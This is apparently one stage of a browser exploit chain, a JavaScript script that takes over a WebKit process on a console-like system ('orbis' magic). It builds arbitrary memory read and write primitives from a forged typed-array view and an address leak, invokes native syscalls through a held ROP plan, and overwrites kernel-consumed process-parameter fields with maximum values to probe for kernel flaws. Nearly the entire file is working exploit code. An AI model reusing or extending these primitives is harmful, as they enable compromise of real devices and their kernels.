// ProcParam untouched-words max-value test. The root page has never
// had these slots mutated: +0x28, +0x30, +0x50, +0x58 (all zero in
// every boot's snapshot). User hypothesis: a massive value in a
// kernel-consumed field could wrap internal arithmetic or flip
// attribute flags. Each slot: write 0xFFFFFFFFFFFFFFFF, run the full
// 9-oracle set (585/606/601/615 + EPERM class 600/603/604/611/613),
// restore, verify. Marker strings carry oracle deltas. 8 markers:
// preflight/598ok/snapok/base/m0-m3. Process-local risk (zero-value
// poison protocol NOT used — 0xFFFFFFFFFFFFFFFF only).
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys598 !== "number")
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function writeAt(addressValue, bytes) {
    if (!Number.isSafeInteger(addressValue) ||
        addressValue % 8 !== 0 ||
        !bytes || bytes.length !== 8)
      throw new Error("write_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      for (var w = 0; w < 8; w++) carrier[w] = bytes[w];
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var n = 0; n < left.length; n++)
      if (left[n] !== right[n]) return false;
    return true;
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function oracleSet() {
    var out = [];
    var names = ["sys585", "sys606", "sys601", "sys615",
      "sys600", "sys603", "sys604", "sys611", "sys613"];
    for (var i = 0; i < names.length; i++) {
      var c = native.call(names[i], [0, 0, 0, 0, 0, 0]);
      var e = (c.value === -1) ? native.readErrno() : null;
      out.push(names[i].slice(3) + "=" + c.value +
        (e === null ? "" : "e" + e));
    }
    return out.join(";");
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("pmw_preflight");
  phase = "call_598";
  var sizePtrOff = 0x1e00, bufOff = 0x200;
  var rootBufAddr = plan.addresses.frame + bufOff;
  var sizeAddr = plan.addresses.frame + sizePtrOff;
  var fv = new DataView(plan.frame.buffer);
  var sizeOrig = fv.getUint32(sizePtrOff, true);
  fv.setUint32(sizePtrOff, 0x1000, true);
  fv.setUint32(sizePtrOff + 4, 0, true);
  var call598 = native.call("sys598", [rootBufAddr, sizeAddr]);
  fv.setUint32(sizePtrOff, sizeOrig, true);
  if (call598.value !== 0)
    throw new Error("call598_failed");
  var rootBase = fv.getUint32(bufOff + 4, true) * 0x100000000 +
    fv.getUint32(bufOff, true);
  mark("pmw_598ok");
  phase = "snapshot";
  var snap = readAt(rootBase, 192);
  if (snap[8] !== 0x4f || snap[9] !== 0x52 ||
      snap[10] !== 0x42 || snap[11] !== 0x49)
    throw new Error("orbis_magic_missing");
  mark("pmw_snapok");
  var baseLine = oracleSet();
  mark("pmw_base");
  // Slots never mutated: +0x28, +0x30, +0x50, +0x58
  var slots = [0x28, 0x30, 0x50, 0x58];
  var maxBytes = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff];
  var lines = [];
  for (var s = 0; s < slots.length; s++) {
    phase = "slot_" + slots[s].toString(16);
    var orig = snap.slice(slots[s], slots[s] + 8);
    writeAt(rootBase + slots[s], maxBytes);
    var ov = oracleSet();
    writeAt(rootBase + slots[s], orig);
    if (!same(readAt(rootBase + slots[s], 8), orig))
      throw new Error("restore_failed_" + slots[s].toString(16));
    lines.push("x" + slots[s].toString(16) + ":max(" + ov + ")");
    mark("pmw_m" + s + ":" + ov.slice(0, 100));
  }
  var restOk = true;
  for (var v = 0; v < slots.length; v++) {
    var chk = readAt(rootBase + slots[v], 8);
    var origV = snap.slice(slots[v], slots[v] + 8);
    if (!same(chk, origV)) restOk = false;
  }
  var after = native.call("getpid", []);
  mark("pmw_done");
  result = { id: "procparam_maxwords_v1",
    status: (after.value === before.value && after.high === 0 &&
      restOk) ? "pass" : "fail",
    details: { root_base: rootBase.toString(16),
      baseline: baseLine.slice(0, 200),
      mutated: lines.join(" | ").slice(0, 420),
      pid_ok: after.value === before.value && after.high === 0,
      restored: restOk } };
} catch (error) {
  result = { id: "procparam_maxwords_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
